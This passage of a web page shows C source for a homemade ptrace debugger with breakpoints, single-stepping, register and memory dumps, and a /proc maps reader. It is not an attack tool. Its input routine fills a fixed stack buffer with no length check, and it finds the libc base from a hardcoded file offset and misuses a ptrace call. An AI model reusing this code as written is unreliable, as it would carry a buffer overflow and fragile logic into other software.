class="line">390</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">ERR</span>&#123;</span></span><br><span class="line">    NOL,</span><br><span class="line">    INPUT_ERR,</span><br><span class="line">    FORK_ERR,</span><br><span class="line">    MALLOC_ERR,</span><br><span class="line">    OPEN_ERR,</span><br><span class="line">    NOTFIND_ERR,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> word_size = <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>);</span><br><span class="line"><span class="keyword">char</span> breakcode[] = &#123;<span class="number">0xcd</span>,<span class="number">0x80</span>,<span class="number">0xcc</span>,<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">breakinfo</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> addr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">breakinfo</span>* <span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">char</span> backcode[<span class="number">9</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">breakinfohead</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> total;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">breakinfo</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">breakinfohead</span>* <span class="title">bh</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">hex2int</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> mm[<span class="number">128</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    mm[<span class="string">&#x27;0&#x27;</span>]=<span class="number">0</span>; mm[<span class="string">&#x27;1&#x27;</span>]=<span class="number">1</span>; mm[<span class="string">&#x27;2&#x27;</span>]=<span class="number">2</span>; mm[<span class="string">&#x27;3&#x27;</span>]=<span class="number">3</span>; mm[<span class="string">&#x27;4&#x27;</span>]=<span class="number">4</span>;</span><br><span class="line">    mm[<span class="string">&#x27;5&#x27;</span>]=<span class="number">5</span>; mm[<span class="string">&#x27;6&#x27;</span>]=<span class="number">6</span>; mm[<span class="string">&#x27;7&#x27;</span>]=<span class="number">7</span>; mm[<span class="string">&#x27;8&#x27;</span>]=<span class="number">8</span>; mm[<span class="string">&#x27;9&#x27;</span>]=<span class="number">9</span>;</span><br><span class="line">    mm[<span class="string">&#x27;a&#x27;</span>]=<span class="number">10</span>; mm[<span class="string">&#x27;b&#x27;</span>]=<span class="number">11</span>; mm[<span class="string">&#x27;c&#x27;</span>]=<span class="number">12</span>; mm[<span class="string">&#x27;d&#x27;</span>]=<span class="number">13</span>; mm[<span class="string">&#x27;e&#x27;</span>]=<span class="number">14</span>; mm[<span class="string">&#x27;f&#x27;</span>]=<span class="number">15</span>;</span><br><span class="line">    mm[<span class="string">&#x27;A&#x27;</span>]=<span class="number">10</span>; mm[<span class="string">&#x27;B&#x27;</span>]=<span class="number">11</span>; mm[<span class="string">&#x27;C&#x27;</span>]=<span class="number">12</span>; mm[<span class="string">&#x27;D&#x27;</span>]=<span class="number">13</span>; mm[<span class="string">&#x27;E&#x27;</span>]=<span class="number">14</span>; mm[<span class="string">&#x27;F&#x27;</span>]=<span class="number">15</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(str==<span class="literal">NULL</span>) </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*str)&#123;</span><br><span class="line">        ans*=<span class="number">16</span>;</span><br><span class="line">        ans+=mm[*str];</span><br><span class="line">        str++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errPrint</span><span class="params">(<span class="keyword">char</span> * msg)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">msgPrint</span><span class="params">(<span class="keyword">char</span> * msg)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bytePrint</span><span class="params">(<span class="keyword">char</span>* codes, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">char</span>) codes[i]);</span><br><span class="line">        <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">8</span> == <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putdata</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">size_t</span> addr, <span class="keyword">char</span> *str, <span class="keyword">int</span> len)</span> </span>&#123;   </span><br><span class="line">    <span class="keyword">char</span> *code;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">u</span>&#123;</span></span><br><span class="line">        <span class="keyword">size_t</span> val;</span><br><span class="line">        <span class="keyword">char</span> word[word_size];</span><br><span class="line">    &#125;data;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len / word_size;</span><br><span class="line">    code = str;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; j) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.word, code, word_size);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, pid, addr + i * <span class="number">8</span>, data.val);</span><br><span class="line">        ++i;</span><br><span class="line">        code += word_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % word_size;</span><br><span class="line">    <span class="keyword">if</span>(j != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.word, code, j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, pid, addr + i * <span class="number">8</span>, data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getdata</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">size_t</span> addr, <span class="keyword">char</span>* str, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *code;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">u</span>&#123;</span></span><br><span class="line">        <span class="keyword">size_t</span> val;</span><br><span class="line">        <span class="keyword">char</span> word[word_size];</span><br><span class="line">    &#125;data;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len / word_size;</span><br><span class="line">    code = str;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">        data.val = ptrace(PTRACE_PEEKDATA, pid, addr + i * <span class="number">8</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(code, data.word, word_size);</span><br><span class="line">        ++i;</span><br><span class="line">        code += word_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % word_size;</span><br><span class="line">    <span class="keyword">if</span> (j != <span class="number">0</span>) &#123;</span><br><span class="line">        data.val = ptrace(PTRACE_PEEKDATA, pid, addr + i * <span class="number">8</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(code, data.word, j);</span><br><span class="line">    &#125;</span><br><span class="line">    str[len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">showReg</span><span class="params">(<span class="keyword">pid_t</span> child, <span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -FORK_ERR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    ptrace(PTRACE_GETREGS, child, <span class="number">0</span>, &amp;regs); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;───────────────────────────────[ REGISTERS ]──────────────────────────────────\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rax:\t%llx\nrbx:\t%llx\nrcx:\t%llx\nrdx:\t%llx\nrsi:\t%llx\nrdi:\t%llx\nrbp:\t%llx\n&quot;</span></span><br><span class="line">        <span class="string">&quot;rsp:\t%llx\nrip:\t%llx\neflags:\t%llx\ncs:\t%llx\nss:\t%llx\nds:\t%llx\nes:\t%llx\n&quot;</span>,</span><br><span class="line">        regs.rax, regs.rbx, regs.rcx, regs.rdx, regs.rsi, regs.rdi, regs.rbp,</span><br><span class="line">        regs.rsp, regs.rip, regs.eflags, regs.cs, regs.ss, regs.ds, regs.es);</span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;──────────────────────────────────────────────────────────────────────────────\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">showCode</span><span class="params">(<span class="keyword">pid_t</span> child, <span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -FORK_ERR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> code[<span class="number">0x40</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    ptrace(PTRACE_GETREGS, child, <span class="number">0</span>, &amp;regs); </span><br><span class="line">    getdata(child,regs.rip,code,<span class="number">0x40</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;───────────────────────────────[ CODE BYTES ]─────────────────────────────────\n&quot;</span>);</span><br><span class="line">    bytePrint(code,<span class="number">0x40</span>); </span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;──────────────────────────────────────────────────────────────────────────────\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">showMemory</span><span class="params">(<span class="keyword">pid_t</span> child)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -FORK_ERR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> code[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> addr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lx&quot;</span>,&amp;addr);</span><br><span class="line">    getchar();</span><br><span class="line">    ptrace(PTRACE_GETREGS, child, <span class="number">0</span>, &amp;regs); </span><br><span class="line">    getdata(child,addr,code,<span class="number">0x40</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;──────────────────────────────────────────────────────────────────────────────\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;search in %lx:\n&quot;</span>,addr);</span><br><span class="line">    bytePrint(code,<span class="number">0x40</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;──────────────────────────────────────────────────────────────────────────────\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inputLine</span><span class="params">(<span class="keyword">char</span> *cmd)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(cmd == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -INPUT_ERR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> tmp[<span class="number">0x40</span>];</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        ch = getchar();</span><br><span class="line">        <span class="keyword">if</span>(ch == <span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            tmp[i]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        tmp[i++] = ch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy</span>(cmd,tmp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setBreak</span><span class="params">(<span class="keyword">pid_t</span> child)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -FORK_ERR;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">breakinfo</span>* <span class="title">bk</span> =</span> (struct breakinfo*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct breakinfo));</span><br><span class="line">    <span class="keyword">if</span>(bk==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -MALLOC_ERR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> addr;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lx&quot;</span>,&amp;addr);</span><br><span class="line">    getchar();</span><br><span class="line">    bk-&gt;addr = addr;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;break at :0x%lx\n&quot;</span>,bk-&gt;addr);</span><br><span class="line">    getdata(child, addr, bk-&gt;backcode, <span class="number">8</span>);</span><br><span class="line">    bytePrint(bk-&gt;backcode,<span class="number">8</span>);</span><br><span class="line">    putdata(child, addr, breakcode, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    bk-&gt;next = bh-&gt;next;</span><br><span class="line">    bh-&gt;next = bk;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">searchBreak</span><span class="params">(<span class="keyword">pid_t</span> child,<span class="keyword">size_t</span> addr,struct breakinfo** bkp)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">breakinfo</span>* <span class="title">tmp</span>=</span>bh-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(tmp!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(addr == tmp-&gt;addr)&#123;</span><br><span class="line">            *bkp = tmp;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        tmp = tmp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    msgPrint(<span class="string">&quot;Miss Breakpoint&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -NOTFIND_ERR;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">unlinkBreak</span><span class="params">(<span class="keyword">pid_t</span> child,struct breakinfo** bkp)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(*bkp == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -INPUT_ERR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">breakinfo</span>* <span class="title">tmp</span>=</span>bh-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(*bkp == bh-&gt;next)&#123;</span><br><span class="line">        bh-&gt;next = bh-&gt;next-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(*bkp);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(tmp-&gt;next!=*bkp)&#123;</span><br><span class="line">        tmp = tmp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    tmp-&gt;next = tmp-&gt;next-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(*bkp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">showBreak</span><span class="params">(<span class="keyword">pid_t</span> child)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">breakinfo</span> *<span class="title">tmp</span> =</span> bh-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(tmp!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Break addr = 0x%lx\n&quot;</span>,tmp-&gt;addr);</span><br><span class="line">        bytePrint(tmp-&gt;backcode,<span class="number">8</span>);</span><br><span class="line">        tmp = tmp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">runBreak</span><span class="params">(<span class="keyword">pid_t</span> child, <span class="keyword">int</span> status)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -FORK_ERR;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">breakinfo</span> *<span class="title">bk</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (WIFEXITED(status))&#123;</span><br><span class="line">        msgPrint(<span class="string">&quot;Process finished&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (WSTOPSIG(status) == SIGTRAP) &#123;  </span><br><span class="line">        ptrace(PTRACE_GETREGS, child, <span class="number">0</span>, &amp;regs);  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(searchBreak(child,regs.rip<span class="number">-3</span>,&amp;bk) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -NOTFIND_ERR;</span><br><span class="line">        &#125;</span><br><span class="line">        putdata(child, bk-&gt;addr, bk-&gt;backcode, <span class="number">8</span>);</span><br><span class="line">        ptrace(PTRACE_SETREGS, child, <span class="number">0</span>, &amp;regs);</span><br><span class="line">        regs.rip = bk-&gt;addr;</span><br><span class="line">        ptrace(PTRACE_SETREGSET, child, <span class="number">0</span>, &amp;regs);</span><br><span class="line">        ptrace(PTRACE_SETREGS, child, <span class="number">0</span>, &amp;regs);</span><br><span class="line">        showReg(child,<span class="number">0</span>);</span><br><span class="line">        showCode(child,<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hit Breakpoint at: 0x%lx\n&quot;</span>, bk-&gt;addr);</span><br><span class="line">        unlinkBreak(child, &amp;bk);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">runStepIn</span><span class="params">(<span class="keyword">pid_t</span> child)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -FORK_ERR;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    showReg(child,<span class="number">0</span>);</span><br><span class="line">    showCode(child,<span class="number">1</span>);</span><br><span class="line">    ptrace(PTRACE_SINGLESTEP, child, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    wait(&amp;status);</span><br><span class="line">    <span class="keyword">if</span> (WIFEXITED(status))&#123;</span><br><span class="line">        msgPrint(<span class="string">&quot;Process finished&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getBase</span><span class="params">(<span class="keyword">pid_t</span> child,<span class="keyword">size_t</span>* probase,<span class="keyword">size_t</span>* libcbase)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -FORK_ERR;</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">char</span> path[<span class="number">0x40</span>];</span><br><span class="line">    <span class="keyword">char</span> cmd[<span class="number">0x50</span>];</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x40</span>];</span><br><span class="line">    <span class="keyword">char</span> *ret;</span><br><span class="line">    <span class="built_in">sprintf</span>(path,<span class="string">&quot;/proc/%d/maps&quot;</span>,child);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Path: %s\n&quot;</span>,path);</span><br><span class="line">    <span class="built_in">sprintf</span>(cmd,<span class="string">&quot;cat %s&quot;</span>,path);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;───────────────────────────────[ VMA MAP ]───────────────────────────────────\n&quot;</span>);</span><br><span class="line">    msgPrint(<span class="string">&quot;LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA&quot;</span>);</span><br><span class="line">    system(cmd);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;──────────────────────────────────────────────────────────────────────────────\n&quot;</span>);</span><br><span class="line">    fd = open(path,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -OPEN_ERR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lseek(fd,<span class="number">0</span>,SEEK_SET);</span><br><span class="line">    read(fd,buf,<span class="number">0x40</span>);</span><br><span class="line">    ret = <span class="built_in">strchr</span>(buf,<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">    *ret = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">    *probase = hex2int(buf);</span><br><span class="line">    lseek(fd,<span class="number">0x19c</span>,SEEK_SET);</span><br><span class="line">    read(fd,buf,<span class="number">0x40</span>);</span><br><span class="line">    ret = <span class="built_in">strchr</span>(buf,<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">    *ret = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">    *libcbase = hex2int(buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;probase: 0x%lx\n&quot;</span>,*probase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libcbase: 0x%lx\n&quot;</span>,*libcbase);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> child;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">size_t</span> probase;</span><br><span class="line">    <span class="keyword">size_t</span> libcbase;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="keyword">char</span> cmd[<span class="number">0x40</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>]==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        errPrint(<span class="string">&quot;need target&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    child = fork();</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">0</span>)&#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        execl(argv[<span class="number">1</span>],argv[<span class="number">1</span>],<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        getBase(child,&amp;probase,&amp;libcbase);</span><br><span class="line">        bh = (struct breakinfohead*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct breakinfohead));</span><br><span class="line">        <span class="keyword">if</span>(bh==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -MALLOC_ERR;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;YHellow &gt; &quot;</span>);</span><br><span class="line">            inputLine(cmd);</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(cmd,<span class="string">&quot;c&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                ptrace(PTRACE_CONT, child, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">                wait(&amp;status);</span><br><span class="line">                runBreak(child,status);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(cmd,<span class="string">&quot;b&quot;</span>) == <span class="number">0</span> || <span class="built_in">strcmp</span>(cmd,<span class="string">&quot;break&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                setBreak(child);</span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(cmd,<span class="string">&quot;b info&quot;</span>) == <span class="number">0</span> || <span class="built_in">strcmp</span>(cmd,<span class="string">&quot;break info&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                showBreak(child);</span><br><span class="line">            &#125;                   </span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(cmd,<span class="string">&quot;n&quot;</span>) == <span class="number">0</span> || <span class="built_in">strcmp</span>(cmd,<span class="string">&quot;ni&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                runStepIn(child);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(cmd,<span class="string">&quot;r&quot;</span>) == <span class="number">0</span> || <span class="built_in">strcmp</span>(cmd,<span class="string">&quot;reg&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                showReg(child,<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(cmd,<span class="string">&quot;s&quot;</span>) == <span 